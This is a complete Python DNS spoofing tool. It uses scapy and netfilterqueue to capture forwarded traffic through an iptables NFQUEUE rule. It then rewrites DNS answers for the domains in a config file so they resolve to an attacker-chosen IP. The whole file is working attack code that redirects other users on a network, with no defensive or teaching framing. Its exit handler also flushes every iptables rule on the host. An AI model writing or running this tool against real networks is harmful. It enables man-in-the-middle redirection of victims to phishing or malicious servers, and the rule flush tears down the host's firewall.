#!/usr/bin/env python3

import argparse
import sys
import os
import signal
from scapy.all import *
import netfilterqueue

# Load target domains from config file
def load_targets(file_path):
    with open(file_path) as f:
        return {line.strip().lower(): True for line in f if line.strip()}

# Spoof DNS response
def spoof_dns(packet, target_domains, spoof_ip):
    scapy_pkt = IP(packet.get_payload())
    if scapy_pkt.haslayer(DNSQR):
        qname = scapy_pkt[DNSQR].qname.decode().rstrip('.')
        if qname.lower() in target_domains:
            print(f"[+] Spoofing DNS response for {qname}")
            spoofed_pkt = IP(dst=scapy_pkt[IP].src, src=scapy_pkt[IP].dst) / \
                          UDP(dport=scapy_pkt[UDP].sport, sport=53) / \
                          DNS(id=scapy_pkt[DNS].id, qr=1, aa=1, qd=scapy_pkt[DNS].qd,
                              an=DNSRR(rrname=scapy_pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
            packet.set_payload(bytes(spoofed_pkt))
    packet.accept()

def main():
    parser = argparse.ArgumentParser(description="Selective DNS Spoofing Tool")
    parser.add_argument("--config", required=True, help="Path to target domains config file")
    parser.add_argument("--spoof-ip", required=True, help="IP address to redirect spoofed domains to")
    parser.add_argument("--queue-num", type=int, default=0, help="Netfilter queue number")
    args = parser.parse_args()

    target_domains = load_targets(args.config)

    def signal_handler(sig, frame):
        print("\n[!] Stopping DNS spoofing...")
        os.system("iptables -F")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    print("[+] Setting iptables rules...")
    os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {args.queue_num}")

    print("[+] Starting DNS spoofing...")
    nfqueue = netfilterqueue.NetfilterQueue()
    nfqueue.bind(args.queue_num, lambda pkt: spoof_dns(pkt, target_domains, args.spoof_ip))
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        signal_handler(None, None)

if __name__ == "__main__":
    main()